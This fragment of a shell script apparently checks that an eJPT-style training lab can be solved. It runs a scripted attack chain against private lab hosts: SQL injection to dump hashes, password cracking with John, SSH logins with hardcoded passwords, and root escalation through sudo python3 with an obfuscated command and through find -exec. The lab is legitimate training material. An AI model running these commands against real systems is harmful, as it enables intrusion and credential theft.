...
CPW=$($A "H=\$(curl -s 'http://10.10.20.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-' | grep -oE 'sysadmin</td><td>[^<]+' | sed 's/.*<td>//'); rm -f /root/.john/john.pot; printf 'sysadmin:%s\n' \"\$H\" > /tmp/h.txt; john --wordlist=/root/wordlist.txt /tmp/h.txt >/dev/null 2>&1; john --show /tmp/h.txt 2>/dev/null | head -1 | cut -d: -f2")
chk "Ac3m3S3rv3r!" "$CPW" "SQLi hash -> john crack -> SSH parol"
UF=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@10.10.20.10 'cat /var/www/html/user.txt' 2>/dev/null")
chk "EJPT{" "$UF" "web-01 USER flag (crack -> SSH foothold)"
# privesc via ssh sysadmin + sudo python3
ROOT=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@10.10.20.10 'sudo /usr/bin/python3 -c \"import os;os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116))\"' 2>/dev/null")
...
LUF=$($A "sshpass -p football ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@10.10.20.20 'cat /home/bob/user.txt' 2>/dev/null")
chk "EJPT{" "$LUF" "linux-02 USER flag (ssh bob)"
LRF=$($A "sshpass -p football ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@10.10.20.20 \"find /home/bob/user.txt -exec /bin/sh -p -c 'cat /root/root.txt' \\;\" 2>/dev/null")
